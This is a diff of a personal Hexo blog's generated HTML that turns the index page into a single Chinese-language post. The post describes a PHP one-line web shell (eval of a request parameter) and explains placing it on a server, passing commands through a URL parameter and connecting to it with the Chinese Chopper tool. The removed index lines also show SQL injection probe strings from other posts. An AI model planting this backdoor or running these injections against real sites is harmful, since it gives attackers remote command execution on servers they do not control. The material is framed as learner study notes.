@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>Hexo</title>
+  <title>一句话木马——&lt;?php eval($_REQUEST [&#39;8&#39;] ) ?&gt; | Hexo</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -59,7 +59,7 @@
 </head>
 
 <!--
-<body class="home-template">
+<body class="post-template">
 -->
 <body id="index" class="lightnav animsition">
 
@@ -167,274 +167,101 @@
         <!-- ============================ Header & Logo bar =========================== -->
 
 
-      <!-- ============================ Hero Image =========================== -->
-
-<section id="hero" class="scrollme">
-    <div class="container-fluid element-img" style="background: url(/img/666.jpg) no-repeat center center fixed;background-size: cover">
-        <div class="row">
-            <div class="col-xs-12 col-sm-8 col-sm-offset-2 col-md-8 col-md-offset-2 vertical-align cover boost text-center">
-                <div class="center-me animateme" data-when="exit" data-from="0" data-to="0.6" data-opacity="0" data-translatey="100">
-                    <div>
-                        
-                        <h2>YOU'VE MADE A <span>BRAVE</span> DECISION, WELCOME.</h2>
-                        <p></p>
-                        
-                        <h2></h2>
-                        <p>每一个不曾起舞的日子都是对生命的辜负。</p>
-                        
-
-                    </div>
-                </div>
-            </div>
-            <!-- // .col-md-12 -->
-        </div>
-        <div class="herofade beige-dk"></div>
-    </div>
-</section>
-
-<!-- Height spacing helper -->
-<div class="heightblock"></div>
-<!-- // End height spacing helper -->
-
-<!-- ============================ END Hero Image =========================== -->
-<!-- ============================ Content =========================== -->
-
+      
 <section id="intro">
     <div class="container">
-        
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2022/03/26/一句话木马的问题/">一句话木马——<?php eval($_REQUEST ['8'] ) ?></a></h3>
-                    <span>
-                        <span class="post-meta">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
       <time datetime="2022-03-26T07:41:01.000Z" itemprop="datePublished">
           2022-03-26
       </time>
     
 </span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        一句话木马
-1&lt;?php eval($_REQUEST [&#x27;8&#x27;] ) ?&gt;
-
-该木马文件放在网页文件夹下(我放在了2.php文件下)
-注意：’8’中的8为我们的“密码”
-打开文件127.0.0.1/2.txt
-12执行命令127.0.0.1/2.txt?8=echo &#x27;ipconfig&#x27;;可获取ip
-
-
-
-注意：php的版本需要在5.3版本以上才可以
-上菜刀
-
-添加进去，双击，即可进
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2022/03/26/一句话木马的问题/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
+                <h1>一句话木马——<?php eval($_REQUEST ['8'] ) ?></h1>
             </div>
         </div>
-        
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2022/03/23/Mysql注入核心/">Mysql注入核心</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2022-03-23T12:55:50.000Z" itemprop="datePublished">
-          2022-03-23
-      </time>
-    
-    
-    | 
-    <a href='/tags/代码/'>代码</a>
-    
-    
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        01
-123456789101112131415161718192021222324252627and 1=1    and 1=2            //判断是否是sql注入,有Id，知道是GET传参order by 3order by 4(报错)          //判断出来三个字段数union select 1,2,database()    //查询数据库名称，前面的id = 1改成1.1，错误好显示联合查询结果知道数据库
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2022/03/23/Mysql注入核心/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
-        </div>
-        
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2022/03/23/Access注入核心/">Access注入核心</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2022-03-23T12:54:18.000Z" itemprop="datePublished">
-          2022-03-23
-      </time>
-    
-    
-    | 
-    <a href='/tags/代码/'>代码</a>
-    
-    
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        1234567891011121314151617doucuent.cookie = &quot;id=&quot; + escape(&quot;171 and 1=1&quot;)doucuent.cookie = &quot;id=&quot; + escape(&quot;171 and 1=2&quot;)  //前面id = 171是页面正常显示，后面and查看是否被当做代码执行doucuent.cookie = &quot
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2022/03/23/Access注入核心/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
-        </div>
-        
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2022/03/20/变成自己喜欢的样子吧-My-BLOG/">变成自己喜欢的样子吧--My BLOG</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2022-03-20T07:47:22.000Z" itemprop="datePublished">
-          2022-03-20
-      </time>
-    
-    
-    | 
-    <a href='/tags/技巧/'>技巧</a>
-    
-    
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        emmm……调整主题中遇到的，嘿嘿首先一个就是这个当时让自己纠结好久的问题(报错让自己头疼！！！)1hexo使用theme出现“ &#123;% extends ‘_layout.swig‘ %&#125; &#123;% import ‘_macro/post.swig‘ as post_template %&#125;“问题
+        <div class="col-md-8 col-md-offset-2">
+      		<p>一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span> [<span class="string">&#x27;8&#x27;</span>] ) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-解决方法
-12原因是hexo在5.0之后把swig给删除了需要自己手动安装npm i hexo-rende
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2022/03/20/变成自己喜欢的样子吧-My-BLOG/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
+<p>该木马文件放在网页文件夹下(我放在了2.php文件下)</p>
+<p><strong>注意：’8’中的8为我们的“密码”</strong></p>
+<p>打开文件127.0.0.1/2.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行命令</span><br><span class="line">127.0.0.1/2.txt?8=echo &#x27;ipconfig&#x27;;可获取ip</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>注意：php的版本需要在5.3版本以上才可以</strong></p>
+<p><strong>上菜刀</strong></p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1648280877909.png" alt="1648280877909"></p>
+<p>添加进去，双击，即可进入目标服务器的电脑</p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
         </div>
-        
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2022/03/20/zkaq题解/">zkaqsql注入题解</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2022-03-20T07:34:13.000Z" itemprop="datePublished">
-          2022-03-20
-      </time>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
     
     
-    | 
-    <a href='/tags/题解/'>题解</a>
+    <a class="pull-right" href="/2022/03/23/Mysql%E6%B3%A8%E5%85%A5%E6%A0%B8%E5%BF%83/">
+        Mysql注入核心 →
+    </a>
     
-    
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        01
-123456789101112131415161718192021222324252627and 1=1    and 1=2            //判断是否是sql注入,有Id，知道是GET传参order by 3order by 4(报错)          //判断出来三个字段数union select 1,2,database()    //查询数据库名称，前面的id = 1改成1.1，错误好显示联合查询结果知道数据库
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2022/03/20/zkaq题解/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
-        </div>
-        
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2022/03/19/hello-world/">Hello World</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2022-03-19T11:45:08.356Z" itemprop="datePublished">
-          2022-03-19
-      </time>
-    
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Quick StartCreate a new p
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2022/03/19/hello-world/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
-        </div>
-        
-        <nav class="pagination" role="pagination">
-          
-          
-        </nav>
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
     </div>
 </section>
-<section id="statement">
-    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
-        <div class="row">
-            <p>Welcome，my friend</p>
-        </div>
-    </div>
-</section>
-<!-- ============================ END Content =========================== -->
+
 
       
 <!-- ============================ Footer =========================== -->
